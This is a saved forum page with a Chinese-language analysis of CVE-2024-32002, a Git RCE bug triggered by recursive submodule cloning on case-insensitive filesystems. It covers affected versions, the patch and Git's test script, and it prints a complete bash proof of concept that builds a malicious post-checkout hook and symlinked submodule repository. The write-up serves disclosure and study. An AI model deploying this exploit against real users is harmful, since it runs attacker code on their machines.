<!DOCTYPE html>
<!-- saved from url=(0035)https://forum.butian.net/share/3040 -->
<html style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT">
    <title>奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析</title>
    <meta name="keywords" content="奇安信,天眼,补天,漏洞,情报,攻防,安全">
    <meta name="description" content="奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析">
    <meta name="author" content="QIANXIN Team">
    <meta name="copyright" content="2021 QIANXIN.com">
    <link rel="icon" href="https://forum.butian.net/ico.png">

    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/community.css" rel="stylesheet">
    <!-- Bootstrap -->
    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/bootstrap.min.css" rel="stylesheet">
    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/font-awesome.min.css" rel="stylesheet">
    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/global.css" rel="stylesheet">
    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/default.css" rel="stylesheet">
    <link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/editor-butian-forum-light.min.css" rel="stylesheet">
    <style>
        #md_view{
            padding: 0 20px;
        }
        #toc {
            margin-top: 15px;
            width: 100%;
            border: none;
            background: #fff;
        }
        #toc.tocFixed{
            position: fixed;
            top: 50px;
            height: auto;
            max-height: calc(100vh - 80px)
        }
        .toc-mobile{
            height: auto;
            position: fixed;
            min-width: calc(100vw - 32px) !important;
            max-height: calc(100vh - 135px);
            width: calc(100vw - 32px) !important;
            display: none;
            z-index: 2147483647;
            border: 1px solid rgb(238, 238, 238);
            box-shadow: rgb(181 181 181) 0px 0px 32px -4px;
            background: white;
            margin: 16px 16px 0;
            left: 0;
            top: 56px;
        }
        .fixed-toc-button{
            position: fixed;
            right: 18px;
            bottom: 10%;
            z-index: 21474836453;
            cursor: pointer;
            border: none;
            border: 1px solid rgb(238, 238, 238);
            box-shadow: rgb(181 181 181) 0px 0px 32px -4px;
        }
        .second-comment-reply{
            cursor: pointer;
        }
        .widget-comments{
            margin-bottom: 30px;
        }
        #md_view img:hover{
            cursor: pointer;
        }
    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="/static/js/html5shiv.min.js"></script>
    <script src="/static/js/respond.min.js"></script>
    <![endif]-->
<link rel="stylesheet" href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/layer.css" id="layuicss-skinlayercss"><script charset="UTF-8" async="" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/gettype.php"></script><script charset="UTF-8" async="" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/fullpage.9.1.9-eyz9lh.js"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/get.php"></script><link href="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/style_https.1.5.8.css" rel="stylesheet"><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset.php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(1).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(2).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(3).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(4).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(5).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(6).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(7).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(8).php"></script><script charset="UTF-8" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/reset(9).php"></script></head>
<body>
<div class="global-nav mb-50">
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container nav">
            <div class="visible-xs header-response">
                <a href="https://forum.butian.net/search/show" style="display:block"><i class="fa fa-search" aria-hidden="true"></i></a>
                <div class="m-header-logo m-header-logo-response"><h1><a href="https://forum.butian.net/" style="height:34px; background-size: auto 44px;"></a></h1></div>
                                <div class="dropdown">
                    <a href="javascript:;" class="pull-right login-btn dropdown-toggle" data-toggle="dropdown" aria-expanded="false" style="background-color: #2a8c70;"><i class="fa fa-user" aria-hidden="true"></i></a>
                        <ul class="dropdown-menu dropdown-menu-right" role="menu" style="top: 48px">
                                                            <li><a href="https://forum.butian.net/people/26257">我的主页</a></li>
                                                                <li><a href="https://forum.butian.net/notifications/getIndex">我的私信</a></li>
                                <li><a href="https://forum.butian.net/profile/anyBase">账号设置</a></li>
                                <li><a href="https://forum.butian.net/people/26257/draft/community">我的草稿</a></li>
                                <li class="divider"></li>
                                <li class="logout"><a>退出</a></li>
                        </ul>
                    </div>
                                <div class="bottom-nav">
                    <div class="opts">
                        
                        <a class="opts-group " href="https://forum.butian.net/questions"><i class="fa fa-question-circle" aria-hidden="true"></i><span>问答</span></a>
                        <div class="opts-group">
                            <div class="btn-group dropup">
                                <i class="fa fa-plus dropdown hoverDropdown" data-toggle="dropdown" aria-hidden="true" aria-expanded="false"><span>发起</span></i>
                                <ul class="dropdown-menu">
                                    <li><a href="https://forum.butian.net/question/create">提问</a></li>
                                    <li><a href="https://forum.butian.net/share/create">文章</a></li>
                                </ul>
                            </div>
                        </div>
                        <a class="opts-group " href="https://forum.butian.net/community"><i class="fa fa-newspaper-o" aria-hidden="true"></i><span>攻防</span></a>
                        <a class="opts-group " href="https://forum.butian.net/movable">
                            <i class="fa fa-flag-checkered" aria-hidden="true"></i>
                            <span>活动</span>
                        </a>

                    </div>
                </div>
            </div>
            <div class="row hidden-xs">
                <div class="col-sm-8 col-md-8 col-lg-8">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#global-navbar">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <div class="logo"><a class="navbar-brand logo" href="https://forum.butian.net/"></a></div>
                    </div>
                    <div class="collapse navbar-collapse" id="global-navbar">
                        <ul class="nav navbar-nav">
                            <li><a href="https://forum.butian.net/">首页 <span class="sr-only">(current)</span></a></li>
                            
                                
                            
                            <li><a href="https://forum.butian.net/questions">问答</a></li>
                            
                                
                            
                            <li><a href="https://forum.butian.net/shop">商城</a></li>
                            
                            <li><a href="https://forum.butian.net/community">实战攻防技术</a></li>
                            <li><a href="https://forum.butian.net/movable">活动</a></li>
                            <li><a href="https://forum.butian.net/questions/Play">摸鱼办</a>
                                <!-- <span class="hot">HOT</span> -->
                            </li>
                        </ul>
                        <form role="search" id="top-search-form" action="https://forum.butian.net/search" method="GET" class="navbar-form hidden-sm hidden-xs pull-right">
                            <span class="btn btn-link"><span class="sr-only">搜索</span><span class="glyphicon glyphicon-search"></span></span>
                            <input type="text" name="word" id="searchBox" class="form-control" placeholder="">
                        </form>
                </div>
                </div>
                <div class="col-sm-4 col-md-4 col-lg-4 text-right" id="template">
                                        <ul class="nav navbar-nav user-menu navbar-right">
                            <!-- <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-hover="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><span class="glyphicon glyphicon-pencil">发帖</span></a>
                                <ul class="dropdown-menu">
                                    <li><a href="https://forum.butian.net/question/create" >我要提问</a></li>
                                    <li role="separator" class="divider"></li>
                                    <li><a href="https://forum.butian.net/share/create" >发布文章</a></li>
                                </ul>
                            </li> -->
                            <li>
                                <a href="https://forum.butian.net/share/3040#" class="fatie-dropdown-toggle" role="button"><span class="glyphicon glyphicon-pencil">发帖</span></a>
                                <ul class="dropdown-menu fatie-dropdown-menu">
                                    <li><a href="https://forum.butian.net/question/create">我要提问</a></li>
                                    <li role="separator" class="divider"></li>
                                    <li><a href="https://forum.butian.net/share/create">发布文章</a></li>
                                </ul>
                            </li>
                            <li><a href="https://forum.butian.net/notifications/getIndex" class="active" id="unread_notifications"><span class="fa fa-bell-o fa-lg"></span><span class="label label-danger">1</span></a></li>
                            
                            <li class="dropdown user-avatar">
                                <a href="https://forum.butian.net/profile/anyBase" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
                                    <img class="avatar-32 mr-5" alt="fengsec" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/default_avatar.jpg">
                                    <span class="hidden-sm hidden-xs">fengsec</span>
                                </a>
                                <ul class="dropdown-menu" role="menu">
                                                                            <li><a href="https://forum.butian.net/people/26257">我的主页</a></li>
                                                                                <li><a href="https://forum.butian.net/notifications/getIndex">我的私信</a></li>
                                        <li><a href="https://forum.butian.net/profile/anyBase">账号设置</a></li>
                                        <li><a href="https://forum.butian.net/people/26257/draft/community">我的草稿</a></li>
                                        <li class="divider"></li>
                                        <li class="logout"><a>退出</a></li>
                                </ul>
                            </li>
                        </ul>
                                    </div>
                </div>
        </div>
    </nav>
</div>
<div class="top-alert mt-60 clearfix text-center">
    <!--[if lt IE 9]>
    <div class="alert alert-danger topframe" role="alert">你的浏览器实在<strong>太太太太太太旧了</strong>，放学别走，升级完浏览器再说
        <a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a>
    </div>
    <![endif]-->

    

    </div>

<div class="wrap">
            <div class="container">
            <div class="row mt-10">
        <div class="col-xs-12 col-md-9 main">
            <div class="widget-article">
                <h3 class="title word-wrap">CVE-2024-32002 Git 远程代码执行漏洞分析</h3>
                                    <ul class="taglist-inline">
                                                    <li class="tagPopup"><a class="tag" href="https://forum.butian.net/topic/48">漏洞分析</a></li>
                                            </ul>
                                <div class="content mt-10">
                    <div class="quote mb-20">
                         Git RCE 漏洞分析：从蛛丝马迹的漏洞分析到RCE
                    </div>
                    <textarea id="md_view_content" style="display:none;">前言
==

5月18号的时候，国外安全研究员Amal Murali(@amalmurali47)放了一张截图，这引起了我的注意：

![](https://cdn.nlark.com/yuque/0/2024/jpeg/12719746/1716166199376-5f5e699c-2ebe-4994-bef5-9dfe1240ee6e.jpeg)

他对git RCE：CVE-2024-32002进行了分析，截图中git的日志输出打了码，让我没办法通过他的演示获取到更多的信息。最开始了解到这漏洞在mac上面可以触发，如果windows同样可以触发的话那影响面就变得更大了。本文将对windows平台的git RCE进行复现分析。

影响版本：

v2.45.0 v2.44.0 &amp;lt;=v2.43.3 &amp;lt;=v2.42.1 v2.41.0 &amp;lt;=v2.40.1 &amp;lt;=v2.39.3

修复版本：

v2.45.1 v2.44.1 v2.43.4 v2.42.2 v2.41.1 v2.40.2 v2.39.4

POC：

&lt;https://github.com/10cks/captain&gt;

&lt;https://github.com/10cks/hook&gt;

初探
==

当我分析这个洞时，市面上并没有出现poc，除了这个安全研究员发的漏洞复现截图外，我还看到了另一个安全研究发的图，不过是在mac os上进行复现的：

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716166798638-d5d8722a-0521-49e2-8589-c35678177cba.png)

我提取出其中的日志信息：

```php
$git clone --recursive git@github.com:markuta/test.git
cloning into test
remote:enumerating objects:18,done.
remote:counting objects:100%(18/18), done.
remote:compressing objects:100%(7/7),done.
remote: total 18 (delta 6), reused 14 (delta 4), pack-reused 0
receiving objects:100%(18/18),done.
resolving deltas:100%(6/6),done.
warning:the following paths have collided (e.g. case-sensitive paths
on a case-insensitive filesystem) and only one from the same
colliding group is in the working tree:

 'a'
submodule'x/y' (git@github.com:markuta/hooky) registered for path 'A/modules/x'
cloning into '/users/naz/dev/test/a/modules/x'...
remote:enumerating objects:15,done.
remote:counting objects:100%(15/15),done.
remote:compressing objects:100%(8/8),done.
remote:total 15 (delta 1), reused 8(delta 0), pack-reused 0
receiving objects:100%(15/15),done.
resolving deltas:100%(1/1),done.
submodule path 'A/modules/x': checked out 'a8da5ef374374251fb81787292d64e52ffe802a3'
```

我推测比较关键的点在于：

```php
on a case-insensitive filesystem) and only one from the same
colliding group is in the working tree:

 'a'
```

结合[漏洞通告](https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv)：

```php
Impact
Repositories with submodules can be crafted in a way that exploits a bug in Git whereby it can be fooled into writing files not into the submodule's worktree but into a .git/ directory. This allows writing a hook that will be executed while the clone operation is still running, giving the user no opportunity to inspect the code that is being executed.

Patches
The problem has been patched in the versions published on Tuesday, May 14th, 2024.

Workarounds
If symbolic link support is disabled in Git (e.g. via git config --global core.symlinks false), the described attack won't work.

As always, it is best to avoid cloning repositories from untrusted sources.

References
git clone --recurse-submodules
core.symlinks
```

具有子模块的存储库可以通过利用 Git 中的错误的方式来制作，从而可以欺骗它不将文件写入子模块的工作树，而是写入 `.git/`目录。这允许编写一个在克隆操作仍在运行时执行的钩子，使用户没有机会检查正在执行的代码。

这里说的“错误的方式”指的是什么？

通过前面的日志我推测可能是目录识别时没有对同名但是大小写不同的目录名进行区别，最后导致了混淆。那么通过什么触发了这个问题呢？漏洞通告中给了`recurse-submodules`和`core.symlinks`这两个提示，这涉及到了子模块和符号链接。

深入理解
====

git的子模块通俗来讲就是使用一个项目时可以递归引用另一个项目，在git clone时通过参数`--recurse-submodules`就可以开启。

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716167989234-4630426c-5c01-429e-9f7c-285e04aab729.png)

漏洞信息显示该漏洞会发生在windows和macOS上，但是没有unix系统。这是为什么？

因为windows和macOS的文件系统不区分大小写，比如我在windows上面新建了一个目录A，再新建一个目录a就会提示我们目录名称重复：

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716168154027-187ddc78-b84c-4a40-a3fa-49d62e06fb68.png)

也就是说`A/modules/x` 和 `a/modules/x`在windows上面被视为相同的路径。

我直接把日志丢给chatGPT，看看他是否存在什么思路：

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716168528702-bef8e4ed-e67d-484a-be37-cf793aa8a086.png)

可以看到思路是跟我的分析一致的，但是我让GPT尝试帮我构建poc，不出意外的失败了。只好自己动手接着分析[补丁](https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d)。

补丁分析
----

补丁涉及了两个文件：

1. builtin/submodule--helper.c
2. t/t7406-submodule-update.sh

第一个文件是补丁，第二个则是一个测试脚本。

我们分析补丁：

补丁新增了一个名为 `dir_contains_only_dotgit` 的函数，用来检查指定的目录中是否只包含 .git 文件夹。这是一个关键的功能，因为它增加了对仓库目录的额外验证，确保在进行某些操作之前目录是预期的状态。

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716169224934-aed75b5a-0c87-4a5f-9170-742e05111474.png)

然后在执行克隆之前增加了一个检查，来确保目录是空的或者仅包含`.git`目录。如果不为空并且不仅仅包含`.git`目录，就会终止操作。

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716169327536-69a58881-25b5-4c4b-bca8-6e55b945dfe7.png)

至于第二个文件，则是一个测试脚本，也就是我们来进行复现使用的关键信息都在里面，用于验证 Git 在处理包含符号链接的子模块路径时的行为。

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716169540205-bbe206b6-fb74-43fb-ac65-48f4d7a0e972.png)

其中的关键代码为：

### 设置符号链接选项开启

```php
test_config_global protocol.file.allow always &amp;&amp;
test_config_global core.symlinks true &amp;&amp;
tell_tale_path="$PWD/tell.tale" &amp;&amp;
```

### 新建hook仓库（目录名为`hook`）

```php
tell_tale_path="$PWD/tell.tale" &amp;&amp;
git init hook &amp;&amp;
(
    cd hook &amp;&amp;
    mkdir -p y/hooks &amp;&amp;
    write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;
    echo HOOK-RUN &gt;&amp;2
    echo hook-run &gt;"$tell_tale_path"
    EOF
    git add y/hooks/post-checkout &amp;&amp;
    test_tick &amp;&amp;
    git commit -m post-checkout
) &amp;&amp;
```

代码内容含义为：新建`hook/y/hooks/post-checkout`文件然后写入下面内容后提交：

```php
echo HOOK-RUN &gt;&amp;2
echo hook-run &gt;"$tell_tale_path"
```

post-checkout 文件是什么？

post-checkout 是 Git 中的一种钩子（hook）。Git hooks 是一些脚本，允许你在特定的事件发生时执行自定义操作。post-checkout 钩子在以下情况之后被调用：

成功运行 git clone 命令。

成功运行 git checkout 命令。

### 新建captain仓库（最后git clone的仓库）

```php
hook_repo_path="$(pwd)/hook" &amp;&amp;
git init captain &amp;&amp;
(
    cd captain &amp;&amp;
    git submodule add --name x/y "$hook_repo_path" A/modules/x &amp;&amp;
    test_tick &amp;&amp;
    git commit -m add-submodule &amp;&amp;
    printf .git &gt;dotgit.txt &amp;&amp;
    git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;
    printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" &gt;index.info &amp;&amp;
    git update-index --index-info &lt;index.info &amp;&amp;
    test_tick &amp;&amp;
    git commit -m add-symlink
) &amp;&amp;
```

添加子模块：

- `hook_repo_path`设置上面hook仓库的路径，使用`git submodule add --name x/y "$hook_repo_path" A/modules/x`把hook仓库中的子模块添加到captain仓库中，子模块的名字是 `x/y`，路径是 `A/modules/x`

创建符号链接并提交：

- 创建一个包含文本内容 ".git" 的文件 dotgit.txt。
- 计算 dotgit.txt 文件的哈希值，并将其存储到 Git 对象数据库中。
- 创建一个索引信息文件 index.info，其中包含创建一个符号链接（指向 .git 文件内容）的信息。
- 使用 git update-index 命令将符号链接的信息添加到 Git 索引中。
- 提交这个符号链接的添加。

### 运行测试

```php
test_path_is_missing "$tell_tale_path" &amp;&amp;
test_must_fail git clone --recursive captain hooked 2&gt;err &amp;&amp;
grep "directory not empty" err &amp;&amp;
test_path_is_missing "$tell_tale_path"
```

这部分我们构造poc需要做的就是`git clone --recursive captain hooked 2&gt;err &amp;&amp;`

构造POC
-----

经过上面的详细分析，如何构造poc也就一目了然了。当我尝试构造poc后，会出现报错：

```php
$ git clone --recursive git@github.com:10cks/CVE-2024-32002-submod.git test
Cloning into 'test'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0
Receiving objects: 100% (8/8), done.
Resolving deltas: 100% (1/1), done.
warning: the following paths have collided (e.g. case-sensitive paths
on a case-insensitive filesystem) and only one from the same
colliding group is in the working tree:

  'a'
Submodule 'x/y' (git@github.com:10cks/CVE-2024-32002-hulk.git) registered for path 'A/modules/x'
fatal: could not create leading directories of 'D:/CVE-2024-32002/RCE/test/A/modules/x': Not a directory
fatal: clone of 'git@github.com:10cks/CVE-2024-32002-hulk.git' into submodule path 'D:/CVE-2024-32002/RCE/test/A/modules/x' failed
Failed to clone 'A/modules/x'. Retry scheduled
fatal: could not create leading directories of 'D:/CVE-2024-32002/RCE/test/A/modules/x': Not a directory
fatal: clone of 'git@github.com:10cks/CVE-2024-32002-hulk.git' into submodule path 'D:/CVE-2024-32002/RCE/test/A/modules/x' failed
Failed to clone 'A/modules/x' a second time, aborting
```

**通过邮件咨询，我才知道即使在windows上开启了符号链接选项，仍需以管理员权限运行才能够正确的执行符号链接。这也是为什么我花了两天时间一直没有在windows上成功实现任意代码执行的原因。**

除此之外，不能通过手动修改`.gitmodules`的方式来对子模块进行设置，会导致远程仓库无法正确进行递归。我们需要在生成`.gitmodules`前就对其进行修改，并且协议需要保持一致：

```php
git submodule add --name x/y "远程子模块仓库" A/modules/x
```

最后完整的poc在5月20号被Amal Murali放出，到这里关于git RCE的分析也就告一段段落了：

```php
#!/bin/bash

# 设置 Git 配置选项
git config --global protocol.file.allow always
git config --global core.symlinks true
# 避免警告消息（设置默认分叉为main）
git config --global init.defaultBranch main 

# 定义 tell-tale 路径
tell_tale_path="$PWD/tell.tale"

# 初始化 hook 仓库
git init hook
cd hook
mkdir -p y/hooks

# 将恶意代码写入 hook，适配windows环境与mac环境
cat &gt; y/hooks/post-checkout &lt;&lt;EOF
#!/bin/bash
calc.exe
open -a Calculator.app
EOF

# 使 hook 可执行：重要
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# 定义 hook 仓库路径
hook_repo_path="$(pwd)/hook"

# 初始化 captain 仓库
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# 创建符号链接
printf ".git" &gt; dotgit.txt
git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" &gt; index.info
git update-index --index-info &lt; index.info
git commit -m "add-symlink"
cd ..

# 本地测试，传到github无需使用此功能
git clone --recursive captain hooked
```

运行`git clone --recursive git@github.com:10cks/captain.git GIT-RCE`后就可以RCE了：

![](https://cdn.nlark.com/yuque/0/2024/png/12719746/1716176968660-815e292a-45d4-4d7f-8757-8af06bc9db69.png)

![tutieshi_640x360_4s_z.gif](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-99189f941f9d4baa6a60cc2e1cc08ba257da03c3.gif)

参考链接
====

&lt;https://twitter.com/amalmurali47/status/1791566569501573163&gt;</textarea>
                    <div id="layer-photos-demo">
                        <div id="md_view"><div class="markdown-body"><h1 blockindex="0">前言</h1>
<p blockindex="1">5月18号的时候，国外安全研究员Amal Murali(@amalmurali47)放了一张截图，这引起了我的注意：</p>
<p blockindex="2"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716166199376-5f5e699c-2ebe-4994-bef5-9dfe1240ee6e.jpeg" alt="" referrerpolicy="no-referrer" layer-index="0"></p>
<p blockindex="3">他对git RCE：CVE-2024-32002进行了分析，截图中git的日志输出打了码，让我没办法通过他的演示获取到更多的信息。最开始了解到这漏洞在mac上面可以触发，如果windows同样可以触发的话那影响面就变得更大了。本文将对windows平台的git RCE进行复现分析。</p>
<p blockindex="4">影响版本：</p>
<p blockindex="5">v2.45.0 v2.44.0 &lt;=v2.43.3 &lt;=v2.42.1 v2.41.0 &lt;=v2.40.1 &lt;=v2.39.3</p>
<p blockindex="6">修复版本：</p>
<p blockindex="7">v2.45.1 v2.44.1 v2.43.4 v2.42.2 v2.41.1 v2.40.2 v2.39.4</p>
<p blockindex="8">POC：</p>
<p blockindex="9"><a href="https://github.com/10cks/captain">https://github.com/10cks/captain</a></p>
<p blockindex="10"><a href="https://github.com/10cks/hook">https://github.com/10cks/hook</a></p>
<h1 blockindex="11">初探</h1>
<p blockindex="12">当我分析这个洞时，市面上并没有出现poc，除了这个安全研究员发的漏洞复现截图外，我还看到了另一个安全研究发的图，不过是在mac os上进行复现的：</p>
<p blockindex="13"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716166798638-d5d8722a-0521-49e2-8589-c35678177cba.png" alt="" referrerpolicy="no-referrer" layer-index="1"></p>
<p blockindex="14">我提取出其中的日志信息：</p>
<pre blockindex="15"><code class="hljs language-php"><span class="hljs-variable">$git</span> <span class="hljs-keyword">clone</span> --recursive git@github.com:markuta/test.git
cloning into test
remote:enumerating objects:<span class="hljs-number">18</span>,done.
remote:counting objects:<span class="hljs-number">100</span>%(<span class="hljs-number">18</span>/<span class="hljs-number">18</span>), done.
remote:compressing objects:<span class="hljs-number">100</span>%(<span class="hljs-number">7</span>/<span class="hljs-number">7</span>),done.
remote: total <span class="hljs-number">18</span> (delta <span class="hljs-number">6</span>), reused <span class="hljs-number">14</span> (delta <span class="hljs-number">4</span>), pack-reused <span class="hljs-number">0</span>
receiving objects:<span class="hljs-number">100</span>%(<span class="hljs-number">18</span>/<span class="hljs-number">18</span>),done.
resolving deltas:<span class="hljs-number">100</span>%(<span class="hljs-number">6</span>/<span class="hljs-number">6</span>),done.
warning:the following paths have collided (e.g. <span class="hljs-keyword">case</span>-sensitive paths
on a <span class="hljs-keyword">case</span>-insensitive filesystem) <span class="hljs-keyword">and</span> only one <span class="hljs-keyword">from</span> the same
colliding group is in the working tree:

 <span class="hljs-string">'a'</span>
submodule<span class="hljs-string">'x/y'</span> (git@github.com:markuta/hooky) registered <span class="hljs-keyword">for</span> path <span class="hljs-string">'A/modules/x'</span>
cloning into <span class="hljs-string">'/users/naz/dev/test/a/modules/x'</span>...
remote:enumerating objects:<span class="hljs-number">15</span>,done.
remote:counting objects:<span class="hljs-number">100</span>%(<span class="hljs-number">15</span>/<span class="hljs-number">15</span>),done.
remote:compressing objects:<span class="hljs-number">100</span>%(<span class="hljs-number">8</span>/<span class="hljs-number">8</span>),done.
remote:total <span class="hljs-number">15</span> (delta <span class="hljs-number">1</span>), reused <span class="hljs-number">8</span>(delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">0</span>
receiving objects:<span class="hljs-number">100</span>%(<span class="hljs-number">15</span>/<span class="hljs-number">15</span>),done.
resolving deltas:<span class="hljs-number">100</span>%(<span class="hljs-number">1</span>/<span class="hljs-number">1</span>),done.
submodule path <span class="hljs-string">'A/modules/x'</span>: checked out <span class="hljs-string">'a8da5ef374374251fb81787292d64e52ffe802a3'</span>
</code></pre>
<p blockindex="16">我推测比较关键的点在于：</p>
<pre blockindex="17"><code class="hljs language-php">on a <span class="hljs-keyword">case</span>-insensitive filesystem) <span class="hljs-keyword">and</span> only one <span class="hljs-keyword">from</span> the same
colliding group is in the working tree:

 <span class="hljs-string">'a'</span>
</code></pre>
<p blockindex="18">结合<a href="https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv">漏洞通告</a>：</p>
<pre blockindex="19"><code class="hljs language-php">Impact
Repositories with submodules can be crafted in a way that exploits a bug in Git whereby it can be fooled into writing files not into the submodule<span class="hljs-string">'s worktree but into a .git/ directory. This allows writing a hook that will be executed while the clone operation is still running, giving the user no opportunity to inspect the code that is being executed.

Patches
The problem has been patched in the versions published on Tuesday, May 14th, 2024.

Workarounds
If symbolic link support is disabled in Git (e.g. via git config --global core.symlinks false), the described attack won'</span>t work.

<span class="hljs-keyword">As</span> always, it is best to avoid cloning repositories <span class="hljs-keyword">from</span> untrusted sources.

References
git <span class="hljs-keyword">clone</span> --recurse-submodules
core.symlinks
</code></pre>
<p blockindex="20">具有子模块的存储库可以通过利用 Git 中的错误的方式来制作，从而可以欺骗它不将文件写入子模块的工作树，而是写入 <code>.git/</code>目录。这允许编写一个在克隆操作仍在运行时执行的钩子，使用户没有机会检查正在执行的代码。</p>
<p blockindex="21">这里说的“错误的方式”指的是什么？</p>
<p blockindex="22">通过前面的日志我推测可能是目录识别时没有对同名但是大小写不同的目录名进行区别，最后导致了混淆。那么通过什么触发了这个问题呢？漏洞通告中给了<code>recurse-submodules</code>和<code>core.symlinks</code>这两个提示，这涉及到了子模块和符号链接。</p>
<h1 blockindex="23">深入理解</h1>
<p blockindex="24">git的子模块通俗来讲就是使用一个项目时可以递归引用另一个项目，在git clone时通过参数<code>--recurse-submodules</code>就可以开启。</p>
<p blockindex="25"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716167989234-4630426c-5c01-429e-9f7c-285e04aab729.png" alt="" referrerpolicy="no-referrer" layer-index="2"></p>
<p blockindex="26">漏洞信息显示该漏洞会发生在windows和macOS上，但是没有unix系统。这是为什么？</p>
<p blockindex="27">因为windows和macOS的文件系统不区分大小写，比如我在windows上面新建了一个目录A，再新建一个目录a就会提示我们目录名称重复：</p>
<p blockindex="28"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716168154027-187ddc78-b84c-4a40-a3fa-49d62e06fb68.png" alt="" referrerpolicy="no-referrer" layer-index="3"></p>
<p blockindex="29">也就是说<code>A/modules/x</code> 和 <code>a/modules/x</code>在windows上面被视为相同的路径。</p>
<p blockindex="30">我直接把日志丢给chatGPT，看看他是否存在什么思路：</p>
<p blockindex="31"><img src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/1716168528702-bef8e4ed-e67d-484a-be37-cf793aa8a086.png" alt="" referrerpolicy="no-referrer" layer-index="4"></p>
<p blockindex="32">可以看到思路是跟我的分析一致的，但是我让GPT尝试帮我构建poc，不出意外的失败了。只好自己动手接着分析<a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">补丁</a>。</p>
<h2 blockindex="33">补丁分析</h2>
<p blockindex="34">补丁涉及了两个文件：</p>
<ol blockindex="35">
<li>builtin/submodule--helper.c</li>
<li>t/t7406-submodule-update.sh</li>
</ol>
<p blockindex="36">第一个文件是补丁，第二个则是一个测试脚本。</p>
<p blockindex="37">我们分析补丁：</p>
<p blockindex="38">补丁新增了一个名为 <code>dir_contains_only_dotgit</code> 的函数，用来检查指定的目录中是否只包含 .git 文件夹。这是一个关键的功能，因为它增加了对仓库目录的额外验证，确保在进行某些操作之前目录是预期的状态。</p>
